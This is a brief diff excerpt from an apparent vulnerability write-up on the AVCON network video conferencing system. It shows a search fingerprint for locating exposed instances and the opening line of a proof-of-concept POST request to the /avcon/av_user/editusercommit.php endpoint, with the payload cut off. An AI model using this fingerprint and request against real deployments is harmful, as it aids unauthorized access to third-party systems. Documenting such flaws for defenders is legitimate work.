@@ -8,7 +8,7 @@ AVCON-网络视频服务系统通过接口 `/avcon/av_user/editusercommit.php?cu
 title=="avcon 网络视频会议系统"
 ```
 
-## poc
+## POC
 
 ```java
 POST /avcon/av_user/editusercommit.php?currentpage=1 HTTP/1.1
